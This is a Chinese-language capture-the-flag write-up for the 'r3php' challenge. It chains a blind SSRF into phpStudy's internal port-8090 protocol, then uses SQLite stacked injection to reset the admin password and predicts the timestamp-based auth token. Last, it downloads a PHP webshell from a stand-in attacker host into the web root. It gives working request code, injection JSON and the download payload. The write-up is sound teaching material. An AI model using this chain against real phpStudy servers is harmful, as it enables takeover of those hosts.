# r3php

## 题目简述

外层 PHP 页面允许以 `file_get_contents()` 请求指定 HTTP URL，并允许调用者设置请求头，但不回显目标响应。容器内部运行 phpStudy：8090 端口是管理程序的自定义 TCP 协议，登录逻辑存在 SQLite 堆叠注入，认证后又提供“下载远程文件到指定路径”的功能。

完整攻击链是：

```text
HTTP SSRF
  -> 8090 自定义协议
  -> SQLite 堆叠注入修改 admin 密码
  -> 预测时间戳令牌
  -> 下载 PHP 文件到 Web 根目录
  -> 执行 /readflag
```

## 解题过程

### 通过 SSRF 发送自定义协议

8090 服务以 `^^^` 作为消息边界，核心载荷是 JSON 命令。外层接口可令 `file_get_contents()` 请求 `http://127.0.0.1:8090/aaa`，并在自定义请求头中放入：

```text
^^^<JSON 命令>^^^<大量填充>
```

8090 的读循环每次 `read()` 后只查找并处理一个分隔消息。如果完整请求一次进入缓冲区，处理完前面的 HTTP 解析错误后会再次阻塞在 `read()`，缓冲区中第二条命令反而不会继续执行。追加约 100000 字节填充可以让发送端在第一次处理结束时仍有数据到达，从而驱动下一轮 `read()` 并解析 JSON。

```python
def send_command(payload):
    requests.post(
        target,
        data={
            "url": "http://127.0.0.1:8090/aaa",
            "header": "^^^" + payload + "^^^" + "A" * 100000,
        },
        timeout=3,
    )
```

外层无回显且常因内网连接阻塞而超时；超时不代表命令没有执行。

### 修改管理员密码

8090 的登录命令把用户名直接拼入 SQLite 查询，并支持堆叠语句。可把 `admin` 密码字段改成已知值：

```json
{
  "command": "login",
  "data": {
    "username": "aaa'; UPDATE ADMINS SET PASSWORD='c26be8aaf53b15054896983b43eb6a65'; -- a",
    "pwd": "123456"
  },
  "token": ""
}
```

其中 `c26be8aaf53b15054896983b43eb6a65` 是程序内部密码算法对应 `123456` 的值，不应替换成普通 `md5("123456")`。让原查询不返回有效用户还可避开后续登录日志路径中的崩溃。

发送修改命令后，再正常发送 `username=admin`、`pwd=123456` 的登录命令。

### 预测认证令牌

后续管理命令需要登录返回的 token，但 SSRF 没有响应正文。逆向可见 token 只依赖用户名与当前秒级时间戳：

```python
inner = hashlib.md5(
    ("admin" + str(timestamp)).encode()
).hexdigest().upper()

token = hashlib.md5(
    inner.encode()
).hexdigest().upper()
```

在发送登录命令前后枚举几秒时间窗口即可得到候选 token，无需读取登录响应。

### 写入并执行 WebShell

在可访问的外部 HTTP 服务上放置一个最小 PHP 文件，内容调用 `/readflag`。再向 8090 发送：

```json
{
  "command": "download_remote_file",
  "uid": 4,
  "data": {
    "remote_url": "http://attacker.example/shell.php",
    "download_to": "/www/admin/localhost_80/wwwroot/shell.php"
  },
  "token": "<预测的 TOKEN>"
}
```

对相邻时间戳候选分别尝试，然后访问外层站点的 `/shell.php`。成功写入的脚本执行 `/readflag` 并输出 flag。

协议分析、注入数据和完整 PoC 可参考 [R3CTF r3php Writeup](https://cf.mnihyc.com/blog/archives/1814)。本文已经解释了为何必须追加大填充、密码哈希的来源、token 的精确计算方式以及最终文件写入位置。

## 方法总结

本题的难点不在单个漏洞，而在盲 SSRF 下组织有状态的内网协议。没有回显时，应寻找可预测状态或可观察副作用：堆叠 SQL 负责修改持久状态，时间戳令牌替代登录响应，远程下载功能则把成功与否变成可访问文件。协议读循环的阻塞行为也是利用链的一部分，不能把 `nc` 中逐行可用的载荷原样搬到一次性 HTTP 请求里。
